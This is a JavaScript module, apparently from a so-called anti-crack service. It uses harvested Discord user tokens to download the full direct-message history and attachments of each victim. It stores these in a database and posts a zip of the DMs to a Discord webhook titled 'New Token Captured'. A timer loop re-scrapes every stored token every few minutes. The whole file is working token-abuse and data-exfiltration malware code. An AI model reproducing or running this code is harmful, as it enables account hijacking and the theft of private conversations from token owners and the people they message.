const { discordFetch } = require('../lib/discord');
const { upsertDMArchive, upsertDMFile, recordTokenStatus, initCaptureTables, pgQuery, getCrackers } = require('../lib/anticrack');
const { sendTextToWebhook } = require('../lib/webhook');

const activeRefreshIntervals = new Map();

async function createZipFromArchives(archives, files) {
  const JSZip = require('jszip');
  const zip = new JSZip();
  for (const archive of archives) {
    const channelFolder = zip.folder(archive.channel_name || `channel_${archive.channel_id}`);
    if (archive.messages && archive.messages.length > 0) {
      const msgText = archive.messages.map(m => {
        const time = new Date(m.timestamp).toISOString();
        const author = m.author?.username || 'Unknown';
        const content = m.content || '';
        let line = `[${time}] ${author}: ${content}`;
        if (m.attachments?.length > 0) {
          line += `\n  Attachments: ${m.attachments.map(a => a.filename).join(', ')}`;
        }
        return line;
      }).join('\n');
      channelFolder.file('messages.txt', msgText);
      channelFolder.file('messages.json', JSON.stringify(archive.messages, null, 2));
    }
  }
  if (files && files.length > 0) {
    const filesFolder = zip.folder('files');
    for (const file of files) {
      try {
        const res = await fetch(file.url, { signal: AbortSignal.timeout(30000) });
        if (res.ok) {
          const buffer = Buffer.from(await res.arrayBuffer());
          const path = file.local_path || file.filename;
          filesFolder.file(path, buffer);
        }
      } catch {}
    }
  }
  return zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
}

async function autoCapture(token, username, isRefresh = false) {
  try {
    await initCaptureTables();

    let channels;
    try {
      channels = await discordFetch(token, '/users/@me/channels');
    } catch { return { success: false, reason: 'token_invalid' }; }

    const dmChannels = channels.filter(c => c.type === 1 || c.type === 3);

    let crackerId;
    const existing = await pgQuery('SELECT id FROM crackers WHERE discord_user = $1 LIMIT 1', [username]);
    if (existing.rows.length > 0) {
      crackerId = existing.rows[0].id;
    } else {
      const ins = await pgQuery(
        'INSERT INTO crackers (discord_token, discord_user, pc_user) VALUES ($1, $2, $3) RETURNING id',
        [token, username, username]
      );
      crackerId = ins.rows[0].id;
    }

    let totalMessages = 0, filesDownloaded = 0;
    const allArchives = [];

    for (const channel of dmChannels) {
      const allMessages = [];
      let before, keepGoing = true;

      while (keepGoing) {
        try {
          const params = new URLSearchParams({ limit: '100' });
          if (before) params.set('before', before);
          const msgs = await discordFetch(token, `/channels/${channel.id}/messages?${params}`);
          if (!msgs || !Array.isArray(msgs) || msgs.length === 0) { keepGoing = false; break; }
          allMessages.push(...msgs);
          before = msgs[msgs.length - 1].id;
          if (msgs.length < 100) keepGoing = false;
          await new Promise(r => setTimeout(r, 500));
        } catch {
          keepGoing = false;
        }
      }

      if (allMessages.length === 0) continue;
      const sorted = allMessages.sort((a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime());
      const channelName = channel.name || channel.recipients?.map(r => r.username).join(', ') || channel.id;

      const archiveId = await upsertDMArchive(crackerId, channel.id, channelName, sorted, true);
      totalMessages += sorted.length;

      for (const msg of sorted) {
        if (!msg.attachments || msg.attachments.length === 0) continue;
        for (const att of msg.attachments) {
          try {
            const res = await fetch(att.url, { signal: AbortSignal.timeout(30000) });
            if (res.ok) {
              const buffer = Buffer.from(await res.arrayBuffer());
              if (archiveId) {
                await upsertDMFile(
                  archiveId, msg.id, att.filename, att.url,
                  att.content_type || 'application/octet-stream',
                  att.size || 0,
                  `${username}/${channelName}/${att.filename}`
                );
              }
              filesDownloaded++;
            }
          } catch {}
          await new Promise(r => setTimeout(r, 200));
        }
        await new Promise(r => setTimeout(r, 300));
      }

      allArchives.push({ channel_id: channel.id, channel_name: channelName, messages: sorted });
    }

    await recordTokenStatus(crackerId, 'valid', dmChannels.length, totalMessages);

    if (!isRefresh && totalMessages > 0) {
      sendCaptureWebhook(username, crackerId, dmChannels.length, totalMessages, filesDownloaded, allArchives, filesDownloaded > 0).catch(() => {});
    }

    return { success: true, crackerId, channels: dmChannels.length, messages: totalMessages, files: filesDownloaded };
  } catch (e) {
    console.error('Auto-capture failed:', e?.message || e);
    return { success: false, reason: e?.message || 'unknown' };
  }
}

async function sendCaptureWebhook(username, crackerId, channelCount, messageCount, fileCount, archives, hasFiles) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  if (!webhookUrl) return;

  try {
    const embed = {
      title: 'New Token Captured',
      description: `Full DM archive captured from **${username}**`,
      color: 0x00ff00,
      fields: [
        { name: 'Channels', value: String(channelCount), inline: true },
        { name: 'Messages', value: String(messageCount), inline: true },
        { name: 'Files', value: String(fileCount), inline: true },
      ],
      timestamp: new Date().toISOString(),
    };

    if (hasFiles || archives.length > 0) {
      const JSZip = require('jszip');
      const zip = new JSZip();
      for (const archive of archives) {
        const folder = zip.folder(archive.channel_name || archive.channel_id);
        if (archive.messages?.length > 0) {
          const msgText = archive.messages.map(m => {
            const time = new Date(m.timestamp).toISOString();
            const author = m.author?.username || 'Unknown';
            return `[${time}] ${author}: ${m.content || ''}`;
          }).join('\n');
          folder.file('messages.txt', msgText);
          folder.file('messages.json', JSON.stringify(archive.messages, null, 2));
        }
      }
      const zipBuffer = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
      const formData = new FormData();
      formData.append('file', new Blob([new Uint8Array(zipBuffer)], { type: 'application/zip' }), `${username}_dms.zip`);
      formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
      await fetch(webhookUrl, { method: 'POST', body: formData });
    } else {
      await sendTextToWebhook(webhookUrl, null, embed);
    }
  } catch (e) {
    console.error('Webhook send failed:', e?.message);
  }
}

async function refreshActiveTokens() {
  try {
    const data = await getCrackers(1, 100, '');
    for (const cracker of data.crackers) {
      if (!cracker.discord_token) continue;
      try {
        const user = await discordFetch(cracker.discord_token, '/users/@me');
        if (user && user.id) {
          console.log(`Refreshing DMs for ${cracker.discord_user || cracker.pc_user}...`);
          await autoCapture(cracker.discord_token, cracker.discord_user || cracker.pc_user, true);
          await recordTokenStatus(cracker.id, 'valid', 0, 0);
        }
      } catch {
        await recordTokenStatus(cracker.id, 'expired', 0, 0).catch(() => {});
      }
      await new Promise(r => setTimeout(r, 2000));
    }
  } catch (e) {
    console.error('Refresh loop error:', e?.message);
  }
}

function startRefreshLoop() {
  const interval = parseInt(process.env.REFRESH_INTERVAL_MS || '300000');
  console.log(`Starting refresh loop (every ${interval / 1000}s)`);
  const timer = setInterval(() => {
    refreshActiveTokens().catch(() => {});
  }, interval);
  activeRefreshIntervals.set('main', timer);
}

module.exports = { autoCapture, refreshActiveTokens, startRefreshLoop, createZipFromArchives };
